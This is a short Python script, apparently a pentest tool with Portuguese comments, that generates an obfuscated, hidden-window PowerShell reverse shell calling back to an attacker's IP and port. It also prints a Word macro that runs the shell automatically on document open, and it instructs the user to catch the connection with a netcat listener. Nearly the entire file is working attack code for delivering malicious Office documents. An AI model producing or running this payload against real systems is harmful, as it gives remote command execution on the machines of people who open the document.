#!/usr/bin/env python3
#
# Autor: Ygor Bittencourt - https://www.linkedin.com/in/ygorbittencourt/
# Versão: 2
# 2022
#
#Run with Netcat  #nc -nlvp PORTA
#
#Enjoy
#
#MIT for you! :)

import sys
import base64

class cores:
    C1 = '\033[92m' #VERDE
    C2 = '\033[93m' #AMARELO
    C3 = '\033[91m' #VERMELHO

def inicio():
    print("A sintaxe eh: python3 %s IP PORTA" % sys.argv[0])
    print("Lembre de rodar o netcat para pegar o reverso: #nc -nlvp PORTA")
    exit()
    
try:
    (ip, porta) = (sys.argv[1], int(sys.argv[2]))
except:
    inicio()

#Fonte do PAYLOAD: https://sentrywhale.com/documentation/reverse-shell
PSPAYL = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PSPAYL = PSPAYL % (ip, porta)
SPLIT = "powershell -nop -w hidden -e " + base64.b64encode(PSPAYL.encode('utf16')[2:]).decode()

#Gerando uma versao terminal em modo oculto
print('')
print(cores.C3 + '[+] BASE64 PowerShell Reverse Shell Generator [+]')
print('')
print(cores.C1 + '[+] VERSÃO PARA TERMINAL EM MODO OCULTO [+]')
print('')
print(SPLIT)
print('')


#Quantidade de Caracteres por linha
n = 80 

#Gerando a macro bonitinha
print(cores.C2 +'[+] VERSÃO EM MACRO PARA INJEÇÃO [+]')
print('-------------------------Corta aqui-------------------------')
print('Sub AutoOpen()')
print('MyMacro')
print('End Sub')
print('')
print('Sub Document_Open()')
print('MyMacro')
print('End Sub')
print('')
print('Sub MyMacro()')
print('Dim Str As String')
print('')
print('Str = ""')
for i in range(0, len(SPLIT), n):
    chunk = SPLIT[i:i + n]
    print('Str = Str + "'+chunk+'"')
print('')
print('CreateObject("Wscript.Shell").Run Str')
print('End Sub')
print('') 
